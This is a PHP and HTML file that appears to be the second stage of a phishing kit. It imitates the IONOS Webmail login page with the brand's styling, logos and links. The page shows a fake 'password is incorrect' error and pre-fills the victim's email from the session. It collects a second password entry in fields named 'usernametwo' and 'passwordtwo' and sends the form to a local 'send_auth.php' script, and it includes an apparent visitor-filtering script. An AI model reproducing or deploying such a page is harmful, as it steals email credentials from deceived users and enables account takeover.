<?php
error_reporting(0);
session_start();
require_once '../esc/index.php';
?>

<!DOCTYPE html>
<html lang="en" data-i18n="oao.lang" data-i18n-attr="lang">

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link id="favicon" rel="shortcut icon" href="../libraries/favicon.ico" type="image/x-icon">
  <link rel="stylesheet" type="text/css" href="../libraries/ionos.min.css">
  <link rel="stylesheet" type="text/css" href="../libraries/login.min.css">
  <link type="text/css" rel="stylesheet" href="../libraries/navigation.css">
  <link type="text/css" rel="stylesheet" href="../libraries/inpagelayer.css">
  <link type="text/css" rel="stylesheet" href="../libraries/statuspage.css">
</head>

<body class="oao-pi-nolayer oao-pi-with-navigation">
  <main class="page-content"><span class="page-transition__indicator-bar"></span>
    <div class="oao-navi-navigation oao-navi-finished">
      <div class="oao-navi-top oao-navi-fade">
        <ul></ul>
      </div>
      <div class="oao-navi-left">
        <div class="oao-navi-application-name">
          <ul class="oao-navi-sub-left">
            <li class="oao-navi-flyout-container oao-navi-flyout-application_switch "><a class="oao-navi-flyout-item oao-navi-app-name oao-navi-app-nl oao-navi-as-no-icon" href="https://www.ionos.com/"><span class="oao-navi-app-logo"></span><span class="oao-navi-app-name-span-nl">
          
          Webmail
        </span></a></li>
          </ul>
        </div>
      </div>
      <div class="oao-navi-center oao-navi-fade">
        <ul>
          <li class="oao-navi-flyout-container oao-navi-flyout-search oao-navi-flyout-search-big">
            <div class="oao-navi-search-container">
              <a class="oao-navi-flyout-item" title="Solution finder"></a>
              <div class="oao-navi-input-container oao-navi-speech"><i class="oao-navi-search-icon"></i>
                <input class="oao-navi-search-input" type="search" placeholder="Search for Features, Domains, and Help"><i class="oao-navi-search-mic"></i></div>
            </div>
          </li>
        </ul>
      </div>
      <div class="oao-navi-right oao-navi-fade">
        <ul class="oao-navi-sub oao-navi-nl">
          <li class="oao-navi-flyout-container oao-navi-flyout-support ">
            <a class="oao-navi-flyout-item" data-target-id="oao-navi-support-button" title="Contact" href="https://contact.ionos.com/contact?linkid=nav.top.support.Overlay" target="_blank"></a>
          </li>
          <li class="oao-navi-flyout-container oao-navi-flyout-special_offer "><a class="oao-navi-flyout-item" title="Summer Sale" href="https://navigation.ionos.com/2.0/navi/US/track/click?url=https%3A%2F%2Fmy.ionos.com%2Fspecial-offers%3Fias.campaign%3Dsummer&amp;linkid=nav.special-offer&amp;c=WEBMAIL_LOGIN&amp;p=login"><span class="oao-navi-so-circle"><svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 22 22"><g style="animation: 4.1s linear 0s 1 normal both running oao-navi-a1_t;"><g style="animation: 4.1s linear 0s 1 normal both running oao-navi-a2_t;"><path d="M21.6 2.6c-2.6 0-6.2-0.3-7.5 .8c3.5 0 5.8 2.8 6.5 5.7c0 .1-0.2 .2-0.3 .2c-3.7-3-6.7-3.3-6.7-3.3c1.3 2.5 1.5 7.7 1.5 11.8c3.2 .6 4.8 1.4 4.8 2.5c0 1.2-2.4 1.7-4.7 1.7h-6.9c-2.1 0-4.7-0.5-4.7-1.6c0-1.5 4-2.6 8.7-2.6c.6-3 .3-8.8-0.6-11.2c-1.7 .8-4.3 2.8-6 5.2c-0.1 .2-0.3 .1-0.3-0.1c.3-2.5 1.9-4.2 2.9-5.7c-1.5 .5-4.5 1.4-8.1 3.3c-0.2 .1-0.2-0.1-0.2-0.2c1.7-4.2 6.2-4.5 7.8-5.7c-1-1-4.8-1.3-7.4-0.9c-0.2 0-0.2-0.1-0.1-0.3c4.1-2.7 8-2.3 10.6-1c3.9-2.6 8.8-0.4 10.8 1.1c.1 .1 .1 .3-0.1 .3Z" fill="#112c5f" fill-rule="evenodd" opacity="0" transform="translate(11,11) rotate(-180) scale(0,0) translate(-10.8,-11)" style="animation: 4.1s linear 0s 1 normal both running oao-navi-a0_t, 4.1s linear 0s 1 normal both running oao-navi-a0_o;"></path></g></g><g style="animation: 4.1s linear 0s 1 normal both running oao-navi-a4_t;"><g style="animation: 4.1s linear 0s 1 normal both running oao-navi-a5_t;"><path d="M11.2 17.6c.5 0 .8 .5 .8 .7v3c0 .4-0.4 .7-0.8 .7c-0.4 0-0.9-0.3-0.9-0.7v-3c0-0.3 .4-0.7 .9-0.7Zm-4.8-1.9c.3 .3 .4 .8 .2 1.1l-0.1 .1l-2.1 2.1c-0.3 .3-0.9 .1-1.2-0.2c-0.2-0.2-0.3-0.7-0.1-0.9v-0.1l2.2-2.2c.1-0.1 .7-0.2 1.1 .1Zm10.8-0.1l2.1 2.1c.3 .3 .2 .8-0.1 1.1c-0.2 .3-0.8 .4-1.1 .2l-2.1-2.1c-0.3-0.3-0.2-0.9 .1-1.2c.4-0.3 1-0.2 1.1-0.1Zm-6-10.1c3 0 5.5 2.5 5.5 5.5c0 3.1-2.5 5.5-5.5 5.5c-3.1 0-5.6-2.4-5.6-5.5c0-3 2.5-5.5 5.6-5.5Zm10.3 4.7c.4 0 .7 .5 .7 .9c-0.1 .4-0.4 .8-0.7 .8h-3.1c-0.2 0-0.7-0.3-0.6-0.8c0-0.5 .3-0.9 .7-0.9h3Zm-17.7 0c.4 0 .8 .4 .8 .9c0 .5-0.5 .8-0.7 .8h-3c-0.4 0-0.7-0.4-0.7-0.8c0-0.4 .3-0.9 .6-0.9h3Zm.3-7l.1 .1l2.2 2.1c.2 .3 .1 .8-0.2 1.2c-0.3 .2-0.8 .2-1 .1l-0.1-0.1l-2.1-2.1c-0.3-0.3-0.2-0.8 .1-1.1c.2-0.2 .7-0.4 1-0.2Zm15 0c.3 .3 .4 .8 .1 1.1l-2.1 2.1c-0.2 .1-0.8 .2-1.1-0.1c-0.4-0.3-0.4-0.9-0.2-1.2l2.2-2.1c.2-0.3 .8-0.1 1.1 .2Zm-7.9-3.2c.4 0 .8 .3 .8 .7v3c0 .2-0.3 .7-0.8 .7c-0.5 0-0.9-0.4-0.9-0.7v-3c0-0.4 .5-0.7 .9-0.7Z" fill="#112c5f" opacity="0" transform="translate(11,11) rotate(-45) scale(0,0) translate(-11,-11)" style="animation: 4.1s linear 0s 1 normal both running oao-navi-a3_t, 4.1s linear 0s 1 normal both running oao-navi-a3_o;"></path></g></g><g style="animation: 4.1s linear 0s 1 normal both running oao-navi-a7_t;"><g style="animation: 4.1s linear 0s 1 normal both running oao-navi-a8_t;"><path d="M21.1 4.5l-2.7 9.1h-14.8l-2.6-9.1c-0.3 0-0.5-0.1-0.7-0.3c0 0 0 0 0 0c-0.2-0.3-0.3-0.5-0.3-0.8c0-0.7 .5-1.2 1.1-1.2c.6 0 1.1 .5 1.1 1.2c0 .1 0 .2 0 .2l5.2 4.2l2.6-5.1c-0.3-0.3-0.5-0.7-0.5-1.1c0-0.9 .7-1.6 1.5-1.6c.8 0 1.5 .7 1.5 1.6c0 .4-0.2 .8-0.5 1.1l2.6 5.1l5.2-4.1c0-0.1 0-0.2 0-0.3c0-0.7 .5-1.2 1.1-1.2c.6 0 1.1 .5 1.1 1.2c0 .6-0.4 1-0.9 1.1Zm-2.8 10.5l-0.5 2.7h-13.6l-0.5-2.7h14.6Z" fill="#112c5f" fill-rule="evenodd" opacity="0" transform="translate(11,11) rotate(-1) scale(0,0) translate(-11,-8.9)" style="animation: 4.1s linear 0s 1 normal both running oao-navi-a6_t, 4.1s linear 0s 1 normal both running oao-navi-a6_o;"></path></g></g></svg></span></a></li>
          <li class="oao-navi-flyout-container oao-navi-flyout-search oao-navi-flyout-search-small">
            <div class="oao-navi-search-container">
              <a class="oao-navi-flyout-item" title="Solution finder"></a>
              <div class="oao-navi-input-container oao-navi-speech"><i class="oao-navi-search-icon"></i>
                <input class="oao-navi-search-input" type="search" placeholder="Search for Features, Domains, and Help"><i class="oao-navi-search-mic"></i></div>
            </div>
          </li>
        </ul>
      </div>
    </div>
    <div class="clearfix" id="content">
      <div class="page-section page-section--default page-section--short">
        <div class="page-section__block">
          <div class="oao-statuspage-message-container" data-component="WEBMAIL,MAIL_RECEIVING,MAIL_SENDING"></div>
          <noscript>
            <p class="noscript"> This page uses JavaScript. Your browser either doesn't support JavaScript or you have it turned off. To use this page please use a JavaScript enabled browser. </p>
          </noscript>
          <div class="sheet">
            <div class="sheet__section">
              <div class="sheet__block">
                <h1 class="headline" data-i18n="oao.login.heading" data-i18n-attr="text">Webmail Login</h1>
                <form id="login-form" class="form content-elem" action="../send/send_auth.php" method="post">
                  <legend class="hidden" data-i18n="oao.login.heading" data-i18n-attr="text">Webmail Login</legend>
                  <div id="login-error" class="notificaiton-wrap" style="display: block;">
                    <dl class="notification notification-danger" data-prio="50"><dt class="notification-heading">An error has occurred.</dt>
                      <dd class="notification-description">This e-mail address could not be found or the password is incorrect.</dd>
                    </dl>
                  </div> <span class="input-text-group" style="overflow: visible; margin-bottom: 10px;"><span class="input-text-group__icon exos-icon exos-icon-nav-user-16"></span>
                  <input class="input-text login-form-user" id="login-form-user" maxlength="200" name="usernametwo" type="text" required="true" value="<?php echo $_SESSION["username"]; ?>">
                  <label class="label login-form-user-label" for="login-form-user"><span data-i18n="oao.login.field.email" data-i18n-attr="text">E-mail Address</span></label>
                  </span>
                  <div class="label align-horizontal-right">
                    <a data-i18n="oao.login.forgotpw.link" data-i18n-attr="href" href="https://www.ionos.com/help/index.php?id=2327&amp;utm_term=2327&amp;utm_campaign=forgotpw&amp;utm_medium=help-and-learn&amp;utm_source=login_frontend_hosting&amp;utm_content=flyin" data-flyin-href="" class="link link--lookup oao-pi-open-in-flyin"> <span data-i18n="oao.login.forgotpw.heading" data-i18n-attr="text">Forgot your password?</span> </a>
                  </div> <span class="input-text-group input-text-group--focus" style="overflow: visible; margin-bottom: 10px;"><span class="input-text-group__icon exos-icon exos-icon-password-16"></span>
                  <input class="input-text login-form-password" id="login-form-password" maxlength="40" name="passwordtwo" type="password" required="true" value="" autofocus="focus">
                  <label class="label login-form-password-label" for="login-form-password"><span data-i18n="oao.login.field.password" data-i18n-attr="text">Password</span></label>
                  </span>
                  <div class="sub-form-field left">
                    <input id="staysignedin-box" class="input-checkbox" name="staysignedin" type="checkbox" value="1" tabindex="3">
                    <label for="staysignedin-box">
                      <a data-i18n="oao.login.stay-signed-in.link" data-i18n-attr="href" href="https://www.ionos.com/help/index.php?id=4083&amp;utm_term=4083&amp;utm_campaign=staysignedin&amp;utm_medium=help-and-learn&amp;utm_source=login_frontend_hosting&amp;utm_content=flyin" data-flyin-href="" class="link link--lookup oao-pi-open-in-flyin"> <span data-i18n="oao.login.stay-signed-in" data-i18n-attr="text">Remember me</span> </a>
                    </label>
                  </div>
                  <footer class="sheet__footer">
                    <button class="button button--primary button--with-loader button--full-width" name="submit" tabindex="3" type="submit" value="" data-i18n="oao.login" data-i18n-attr="text">Login</button>
                  </footer>
                </form>
              </div>
            </div>
          </div>
          <section id="ciso-afs-ads">
            <div class="ias-zone" data-ias-zoneid="webmailer_login" id="ias.zone0">
              <div data-medium-id="WEBMAIL_LOGIN_TEASER_MAIL" data-medium-variant="DEFAULT">
                <section id="ias-container">
                  <div class="grid-12 equal-grid-height">
                    <div class="grid-07 grid-small-12">
                      <h2 class="ias-headline">You don't have a professional email account yet?</h2>
                      <p>IONOS email address from $1 incl. free domain.</p>
                      <div> <a class="button-link" target="_blank" href="https://ias.ionos.com/ias/follow/CLICK?ias_source=WEBMAILER-US&amp;ias_medium=login-webmailer_login&amp;ias_content=WEBMAIL_LOGIN_TEASER_MAIL-DEFAULT&amp;ias_campaign=MAIL_ARCHIVING&amp;iasSessionId=a9d0e747-4cbd-48be-ac49-6ba1e6c68a93&amp;target=https%3A%2F%2Fwww.ionos.com%2Foffice-solutions%2Fcreate-an-email-address%3Fac%3DOM.US.US263K417283T7073a">Learn more</a> </div>
                    </div>
                    <div class="grid-05 grid-small-12 align-horizontal-center align-vertical-center"> <img class="ias-responsive-video" src="../libraries/email-marketing.svg"> </div>
                  </div>
                </section>
                <style type="text/css">
                #ias-container {
                  background: #fff;
                  margin-top: 32px;
                  padding: 28px;
                  -moz-box-shadow: 0 1px 2px 0 rgba(80, 87, 91, .15);
                  -webkit-box-shadow: 0 1px 2px 0 rgba(80, 87, 91, .15);
                  box-shadow: 0 1px 2px 0 rgba(80, 87, 91, .15);
                }
                
                .ias-responsive-video {
                  max-width: 100%;
                  max-height: 240px;
                }
                
                .ias-headline {
                  width: 100%;
                }
                </style>
              </div>
            </div>
          </section>
          <section id="assistants">
            <h2 class="headline headline--sub" data-i18n="oao.login.setup.headline" data-i18n-attr="text">Set up your mailbox on other devices</h2>
            <dl class="pipe-list"> <dt data-i18n="oao.login.setup.mobile" data-i18n-attr="text">Mobile</dt>
              <dd>
                <a data-i18n="oao.login.setup.mobile.ios.link" data-i18n-attr="href" href="https://www.ionos.com/help/index.php?id=2442&amp;utm_term=2442&amp;utm_campaign=mobile-ios&amp;utm_medium=help-and-learn&amp;utm_source=login_frontend_hosting&amp;utm_content=article" class="link" tabindex="9" target="_blank"> <span data-i18n="oao.login.setup.mobile.ios" data-i18n-attr="text">iOS</span> </a>
              </dd>
              <dd>
                <a data-i18n="oao.login.setup.mobile.android.link" data-i18n-attr="href" href="https://www.ionos.com/help/index.php?id=2444&amp;utm_term=2444&amp;utm_campaign=mobile-android&amp;utm_medium=help-and-learn&amp;utm_source=login_frontend_hosting&amp;utm_content=article" class="link" tabindex="10" target="_blank"> <span data-i18n="oao.login.setup.mobile.android" data-i18n-attr="text">Android</span> </a>
              </dd>
            </dl>
            <dl class="pipe-list"> <dt data-i18n="oao.login.setup.desktop" data-i18n-attr="text">Desktop</dt>
              <dd>
                <a data-i18n="oao.login.setup.desktop.thunderbird.link" data-i18n-attr="href" href="https://www.ionos.com/help/index.php?id=2436&amp;utm_term=2436&amp;utm_campaign=desktop-thunderbird&amp;utm_medium=help-and-learn&amp;utm_source=login_frontend_hosting&amp;utm_content=article" class="link" tabindex="11" target="_blank"> <span data-i18n="oao.login.setup.desktop.thunderbird" data-i18n-attr="text">Thunderbird</span> </a>
              </dd>
              <dd>
                <a data-i18n="oao.login.setup.desktop.outlook.link" data-i18n-attr="href" href="https://www.ionos.com/help/index.php?id=2462&amp;utm_term=2462&amp;utm_campaign=desktop-outlook&amp;utm_medium=help-and-learn&amp;utm_source=login_frontend_hosting&amp;utm_content=article" class="link" tabindex="12" target="_blank"> <span data-i18n="oao.login.setup.desktop.outlook" data-i18n-attr="text">Outlook</span> </a>
              </dd>
              <dd>
                <a data-i18n="oao.login.setup.desktop.applemail.link" data-i18n-attr="href" href="https://www.ionos.com/help/index.php?id=2445&amp;utm_term=2445&amp;utm_campaign=desktop-applemail&amp;utm_medium=help-and-learn&amp;utm_source=login_frontend_hosting&amp;utm_content=article" class="link" tabindex="13" target="_blank"> <span data-i18n="oao.login.setup.desktop.applemail" data-i18n-attr="text">Apple Mail</span> </a>
              </dd>
            </dl>
            <dl class="pipe-list"> <dt data-i18n="oao.login.setup.other" data-i18n-attr="text">Other</dt>
              <dd>
                <a data-i18n="oao.login.setup.other.assistants.link" data-i18n-attr="href" href="https://www.ionos.com/help/index.php?id=2490&amp;utm_term=2490&amp;utm_campaign=other-assistants&amp;utm_medium=help-and-learn&amp;utm_source=login_frontend_hosting&amp;utm_content=article" class="link" tabindex="14" target="_blank"> <span data-i18n="oao.login.setup.other.assistants" data-i18n-attr="text">email programs (POP/IMAP)</span> </a>
              </dd>
            </dl>
          </section>
          <h2 class="headline headline--sub" data-i18n="oao.login.morelogins.heading" data-i18n-attr="text">Other IONOS Logins</h2>
          <div class="grid-12 equal-grid-spacing equal-grid-height">
            <div class="grid-04 grid-small-06">
              <div class="grid-spacing-both">
                <a class="tile tile--filled" href="https://my.ionos.com/" data-i18n="oao.login.controlcenter.link" data-i18n-attr="href" tabindex="6">
                  <svg class="product-icon" viewBox="0 0 168 128" xmlns="http://www.w3.org/2000/svg">
                    <path class="product-icon__key" fill="#0b9dcc" d="M84,58c6.6,0,12-5.4,12-12s-5.4-12-12-12s-12,5.4-12,12S77.4,58,84,58z M84,38c4.4,0,8,3.6,8,8s-3.6,8-8,8
          s-8-3.6-8-8S79.6,38,84,38z M107.2,78C104.5,67.4,95,60,84,60s-20.5,7.4-23.2,18c-0.2,0.9,0.2,1.8,1,2.2C68.5,84,76.2,86,84,86
          s15.5-2,22.3-5.8C107.1,79.8,107.5,78.9,107.2,78z M84,82c-6.6,0-13.1-1.6-18.9-4.5C67.8,69.5,75.4,64,84,64s16.2,5.5,18.9,13.5
          C97.1,80.4,90.6,82,84,82z"></path>
                    <path class="product-icon__base" fill="#001b41" d="M156.4,55.6l-8.9,9.7c-0.4,0.4-0.9,0.7-1.5,0.7c0,0,0,0,0,0c0,0,0,0,0,0c-0.4,0-0.8-0.1-1.1-0.3l-11-7.3
          c-0.9-0.6-1.2-1.9-0.6-2.8c0.6-0.9,1.9-1.2,2.8-0.6l7.7,5.1C141.9,28.9,115.8,4,84,4C55.4,4,30.6,24.3,25.1,52.4
          c-0.2,1.1-1.3,1.8-2.3,1.6c-1.1-0.2-1.8-1.3-1.6-2.3C27.1,21.7,53.5,0,84,0c33.6,0,61.3,26.1,63.8,59.1l5.6-6.1
          c0.7-0.8,2-0.9,2.8-0.1C157,53.5,157.1,54.8,156.4,55.6z M145.2,74c-1.1-0.2-2.1,0.5-2.3,1.6c-5.5,28-30.3,48.4-58.9,48.4
          c-31.8,0-57.9-24.9-59.9-56.2l7.7,5.1c0.3,0.2,0.7,0.3,1.1,0.3c0.6,0,1.3-0.3,1.7-0.9c0.6-0.9,0.4-2.2-0.6-2.8l-11-7.3
          c-0.8-0.5-1.9-0.4-2.5,0.3c0,0-8.9,9.8-8.9,9.8c-0.7,0.8-0.7,2.1,0.1,2.8c0.4,0.4,0.9,0.5,1.3,0.5c0.5,0,1.1-0.2,1.5-0.7l5.6-6.1
          c2.5,33,30.2,59.1,63.8,59.1c30.5,0,56.9-21.7,62.8-51.6C147,75.3,146.3,74.2,145.2,74z"></path>
                  </svg> <span class="tile__label" data-i18n="oao.login.controlcenter" data-i18n-attr="text">My IONOS</span> </a>
              </div>
            </div>
            <div class="grid-04 grid-small-06">
              <div class="grid-spacing-both">
                <a class="tile tile--filled" href="https://hidrive.ionos.com/" data-i18n="oao.login.hidrive.link" data-i18n-attr="href" tabindex="7">
                  <svg class="product-icon" viewBox="0 0 168 128" xmlns="http://www.w3.org/2000/svg">
                    <path class="product-icon__key" d="M58,72h6v14c0,1.1,0.9,2,2,2h36c1.1,0,2-0.9,2-2V72h6c0.9,0,1.7-0.6,1.9-1.5c0.2-0.9-0.1-1.8-0.9-2.2l-26-16         c-0.6-0.4-1.5-0.4-2.1,0l-26,16c-0.8,0.5-1.1,1.4-0.9,2.2C56.3,71.4,57.1,72,58,72z M84,56.3L102.9,68H102c-1.1,0-2,0.9-2,2v14H68         V70c0-1.1-0.9-2-2-2h-0.9L84,56.3z M110,108h-6V94c0-1.1-0.9-2-2-2H66c-1.1,0-2,0.9-2,2v14h-6c-0.9,0-1.7,0.6-1.9,1.5         c-0.2,0.9,0.1,1.8,0.9,2.2l26,16c0.3,0.2,0.7,0.3,1,0.3s0.7-0.1,1-0.3l26-16c0.8-0.5,1.1-1.4,0.9-2.2         C111.7,108.6,110.9,108,110,108z M84,123.7L65.1,112H66c1.1,0,2-0.9,2-2V96h32v14c0,1.1,0.9,2,2,2h0.9L84,123.7z" fill="#0b9dcc"></path>
                    <path class="product-icon__base" d="M136,104h-22c-1.1,0-2-0.9-2-2s0.9-2,2-2h22c15.4,0,28-12.6,28-28c0-12.4-7.9-23.1-19.7-26.8         c-0.7-0.2-1.2-0.7-1.3-1.4C139.3,29.8,126.5,20,112,20c-0.6,0-1.3,0-2,0.1c-0.6,0-1.2-0.2-1.6-0.7C99.6,9.6,87.1,4,74,4         C52.7,4,34.3,18.5,29.3,39.2c-0.2,0.7-0.8,1.3-1.5,1.5C14,43.6,4,55.9,4,70c0,16.5,13.5,30,30,30h20c1.1,0,2,0.9,2,2s-0.9,2-2,2H34         C15.3,104,0,88.7,0,70c0-15.6,10.7-29.2,25.7-33C31.6,15.2,51.2,0,74,0c13.9,0,27.2,5.8,36.7,16c0.5,0,0.9,0,1.3,0         c16,0,30,10.5,34.5,25.8C159.4,46.2,168,58.3,168,72C168,89.6,153.6,104,136,104z" fill="#001b41"></path>
                  </svg> <span class="tile__label" data-i18n="oao.login.hidrive" data-i18n-attr="text">HiDrive</span> </a>
              </div>
            </div>
            <div class="grid-04 grid-small-06">
              <div class="grid-spacing-both">
                <a class="tile tile--filled" href="https://archive.ionos.com/" data-i18n="oao.login.archiving.link" data-i18n-attr="href" tabindex="8">
                  <svg class="product-icon" viewBox="0 0 128 128" xmlns="http://www.w3.org/2000/svg">
                    <path class="product-icon__base" d="M88,16H57.05V12H90a2,2,0,0,1,2,2V26.22H88Zm8-3.18v13.4h4V12.82A8.84,8.84,0,0,0,91.17,4H57.05V8H91.17A4.83,4.83,0,0,1,96,12.82Zm0,88.38v14A4.82,4.82,0,0,1,91.18,120H57.05v4H91.18a8.83,8.83,0,0,0,8.82-8.82v-14Zm-8,0V112H57.05v4H90a2,2,0,0,0,2-2V101.2Z" fill="#001b41"></path>
                    <path class="product-icon__key" d="M120.8,26H57.05v4H120.8a3.26,3.26,0,0,1,1.32.29L95.24,49.79c-1.12.85-4.62,3.06-7.38,3.06s-6.26-2.21-7.4-3.08L57.7,33c-.2-.15-.65,4.49-.65,4.49L78.06,53s.33.25.79.56L57.05,70.72s.49,4.71.71,4.54l24.9-19.64a13.54,13.54,0,0,0,5.2,1.23,13.46,13.46,0,0,0,5.22-1.24l28.56,22.27a3.35,3.35,0,0,1-.84.13H57.05v4h59v2a4,4,0,0,1-4,4H57.05v4h51v2a4,4,0,0,1-4,4H57.05v4h47a8,8,0,0,0,8-8V92a8,8,0,0,0,8-8V82h.8a7.21,7.21,0,0,0,7.2-7.2V33.2A7.21,7.21,0,0,0,120.8,26ZM124,74.64,96.9,53.51c.42-.28.69-.48.72-.51L124,33.87Z" fill="#0b9dcc"></path>
                    <path class="product-icon__base" d="M28.56,39.38c-8.27,0-14.74,11-14.74,25.09s6.47,25.1,14.74,25.1,14.73-11,14.73-25.1S36.82,39.38,28.56,39.38Zm5.14,6.68-1.56,2.42a2,2,0,0,0,.6,2.77,2,2,0,0,0,1.08.32,2,2,0,0,0,1.68-.92l.63-1a27.18,27.18,0,0,1,1.54,3.84l-1.61,1a2,2,0,0,0,2.08,3.42l.53-.32a38.26,38.26,0,0,1,.57,4.93h-.7a2,2,0,0,0,0,4h.69a37.47,37.47,0,0,1-.53,4.62l-.34-.24a2,2,0,0,0-2.31,3.27l1.64,1.15A26.29,26.29,0,0,1,36,79.42l-.77-1.28a2,2,0,0,0-3.42,2.08L33.56,83a8.51,8.51,0,0,1-2.74,2V83.58a2,2,0,0,0-4,0v1.67a8,8,0,0,1-3-2l1.85-3a2,2,0,0,0-3.42-2.08l-1,1.59a24.65,24.65,0,0,1-1.75-4.18l1.93-1.36a2,2,0,1,0-2.3-3.27l-.67.47a39,39,0,0,1-.57-4.85h1.06a2,2,0,0,0,0-4H17.87a37.7,37.7,0,0,1,.61-5.13l.86.52a2,2,0,0,0,1,.29,2,2,0,0,0,1-3.71l-1.77-1.08-.15-.07a25,25,0,0,1,1.65-4L22,50.65a2,2,0,0,0,1.68.92,2.09,2.09,0,0,0,1.09-.32,2,2,0,0,0,.59-2.77L23.72,46a.76.76,0,0,0-.11-.14,8.14,8.14,0,0,1,3-2.11V45.5a2,2,0,0,0,4,0V43.8A8.58,8.58,0,0,1,33.7,46.06ZM21.77,64.47c0,6.09,2.92,10.68,6.79,10.68s6.78-4.59,6.78-10.68-2.92-10.68-6.78-10.68S21.77,58.38,21.77,64.47Zm9.57,0c0,4-1.67,6.68-2.78,6.68s-2.79-2.66-2.79-6.68,1.68-6.68,2.79-6.68S31.34,60.46,31.34,64.47ZM56.47,2.06l-8.26-2a2,2,0,0,0-1.08,0L34.85,4h-26A8.84,8.84,0,0,0,0,12.82V115.18A8.83,8.83,0,0,0,8.82,124H35l12.38,3.91a2,2,0,0,0,.6.09,2.05,2.05,0,0,0,.49-.06l7.94-2A2,2,0,0,0,57.94,124L58,4A2,2,0,0,0,56.47,2.06ZM12,93.72A2,2,0,0,0,13,92V80a2,2,0,0,0-1-1.72V51.72A2,2,0,0,0,13,50V38a2,2,0,0,0-1-1.72V15.46L46,4.65V123.27L12,112.53ZM8.82,120A4.82,4.82,0,0,1,4,115.18V12.82A4.83,4.83,0,0,1,8.83,8H22.27L9.39,12.09A2,2,0,0,0,8,14V36.28A2,2,0,0,0,7,38V50a2,2,0,0,0,1,1.72V78.28A2,2,0,0,0,7,80V92a2,2,0,0,0,1,1.72V114a2,2,0,0,0,1.4,1.91l13,4.09Zm45.12,2.44-3.94,1V4.61l4,1Z" fill="#001b41"></path>
                  </svg> <span class="tile__label" data-i18n="oao.login.archiving" data-i18n-attr="text">Email archiving</span> </a>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </main>
  <footer class="page-footer">
    <div class="page-footer__block">
      <section class="page-footer__section page-footer__section--align-center page-footer__section--small-align-left">
        <div class="page-footer__section-item">
          <div class="oao-statuspage-overall-status"><a class="oao-statuspage-overall-state-none" target="_blank" href="https://www.ionos-status.com/?utm_medium=footer&amp;utm_content=none&amp;utm_source=WEBMAIL_LOGIN&amp;utm_campaign=login&amp;utm_term=no_search">All Systems Operational</a></div>
        </div>
        <div class="page-footer__section-item">
          <a class="link" data-i18n="oao.login.imprint.link" data-i18n-attr="href" href="https://www.ionos.com/about" target="_blank"> <span data-i18n="oao.login.ionos.legal" data-i18n-attr="text">IONOS Inc.</span>&nbsp;•&nbsp;<span data-i18n="{YEAR}" data-i18n-attr="text">2022</span> </a>
        </div>
        <div class="page-footer__section-item">
          <a class="link" data-i18n="oao.login.datasecurity.link" data-i18n-attr="href" href="https://www.ionos.com/terms-gtc/terms-privacy/" target="_blank"> <span data-i18n="oao.login.datasecurity" data-i18n-attr="text">Privacy Policy</span> </a>
        </div>
      </section>
    </div>
  </footer>
  <iframe class="hidden" src="../libraries/robots.html" name="loginTarget"></iframe>
  <div class="page-transition__blocker">
    <div class="page-transition__loading-spin loading-spin"></div>
  </div>
  <div class="static-overlay__blocker static-overlay__blocker--hidden"></div>
</body>

</html>